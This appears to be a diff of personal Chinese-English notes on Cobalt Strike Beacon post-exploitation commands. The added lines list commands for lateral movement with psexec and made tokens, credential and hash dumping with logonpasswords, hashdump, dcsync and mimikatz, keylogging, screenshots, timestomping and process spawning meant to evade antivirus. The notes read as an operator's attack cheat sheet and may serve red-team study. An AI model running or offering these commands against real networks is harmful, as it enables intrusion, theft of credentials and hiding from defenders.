@@ -149,6 +149,8 @@ https://www.youtube.com/watch?time_continue=2&v=fnCLdPOmZOk&feature=emb_logo
 [MSF上线CS_adobe flash](https://www.youtube.com/watch?v=fnCLdPOmZOk&t=2s)
 erwerwer
 ## Beacon/Cmd
+[Link](https://www.cnblogs.com/icui4cu/p/16056428.html)
+
 ```shell
 # ec2 - smb 是一个Listener
 beacon > jump psexec64 FILESERVER ec2 - smb
@@ -159,6 +161,7 @@ beacon > rev2self # 恢复原始令牌
 
 beacon > make_token teamssix\administrator Test123!
 beacon > jump psexec_psh 192.168.175.200 smb
+beacon > logonpasswords
 ```
 
 * Agent Context
@@ -186,6 +189,13 @@ __Execute__
   * `cd c:\folder`
 * Print the working directory
   * `pwd`
+
+| CMD   | 回显 | —      | —                            |
+| ----- | ---- | ------- | ----------------------------- |
+| shell | Y    | cmd.exe | [path:%COMSPEC%] [args:其余]  |
+| run   | Y    | cmd.exe | [path:空] [args:全部命令放这] |
+| exec  | N    | 同run   |                               |
+
 <br>
 
 * __Use PowerShell through Beacon__
@@ -195,14 +205,16 @@ __Execute__
   * `powershell cmdlet args`
 * Get help for a script:
   * `powershell Get-Help cmdlet-Full`
+  * `powershell 2+2`
 <br><br>
 
 * __Use a NET assembly through Beacon__
   * `execute-assembly [/local/file.exe][args]`
+  * `execute-assembly taowu-cobalt-strike-master/script/FakeLogonScreen.exe` 太假了
 * Run a command via cmd.exe
   * `shell [command][args]`
 * Use PowerShell without powershell.exe
-  * `powerpick [cmdlet][args]`
+  * `powerpick [cmdlet][args]` -- 内存免杀执行powershell命令
 * Run PowerShell within another process
   * `psinject [pid][arch][cmdlet][args]`
 
@@ -224,13 +236,65 @@ __Session Prepping__
 * Configure "safe" temporary processes
   - Use `ps` to survey processes on target
   - Use `ppid` to anchor to a specific parent process， 
-  - Use `spawnto [arch][path][args]` to change program Cobalt Strike launches for temporary processes
+  - Use `spawnto [arch][path][args]` to change program Cobalt Strike launches for temporary processes, 默认rundll32,可以spawnto 到dllhost [Why is rundll32.exe connecting to the internet? - Cobalt Strike Research and Development](https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet/)
+    - `spawnto x86 C:\Windows\syswow64\dllhost.exe`
   - Use `blockdlls start` to enable DLL blocking (blinds userland hooks `[caveats apply]` on Windows 10)
 <br>
 
 1. 方式1. 右击 Session - Explore - Process List - 选一个进程 Inject
   - 右击某进程 - 设置为PPID, 使用spawn时, 会以新PPID生成
 2. 方式2. `bacon > spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`
+
+<br>
+
+__File Downloads__
+* Download a file
+  * `download [file]` , 下载文件在 %cs%\downloads\ 下
+* Cancel a download
+  * `cancel [file|*]`
+* See file downloads in progress
+  * `downloads`
+* Get to downloaded files
+  *  `View->Downloads` , 多选文件后  `Sync Files`
+
+__File Uploads__
+* Use upload command to upload a file
+  * `upload [/path/to/file]`
+* Change file's timestamps
+  * `timestomp [destination] [source]`
+
+User Exploitation
+* `jobs`
+* `jobkill ID`
+* Deploy Screenshot Tool
+  * `screenshot [pid] [x86|x64] [time]`
+* Deploy Keystroke Logger
+  * `keylogger` 或 `keylogger [pid] [x86|x64]` 
+* Results at:
+  * `View -Screenshots` and `View -Keystrokes` 右击 X 可以浮动窗口或分屏
+* Watch or control target's desktop
+  * sleep 0
+  * desktop [pid] [arch] [low|high]
+* Use `desktop` by itself to spawn a temporary process and inject into it.
+
+__Elevate Commands__
+
+* `elevate`
+* `runasadmin`, 右击session - Access - One-Liner, 选Listener, 生成后复制
+  * beacon > runasadmin 粘贴运行, `connect 192.168.239.132 4444`
+
+__Spawn As__
+* 用其他用户登录
+* `[beacon] -> Access -> Spawn As`
+
+__Credentials and Hashes__
+* `logonpasswords` recovers credentials
+  * GhostPack [SafetyKatz.exe](https://github.com/GhostPack/SafetyKatz)
+  * [Internal Monologue](https://github.com/eladshamir/Internal-Monologue) 不触碰LSASS的情况下抓取 NTLM Hashes 的攻击方式
+* `hashdump` recovers local account hashes
+  * Use `dcsync` for domain accounts, `dcsync [DOMAIN.fqdn] <DOMAIN\user>`
+  * `mimikatz !lasdump::sam` for local
+* `View -> Credentials` to manage
 
 ## Plugins
 
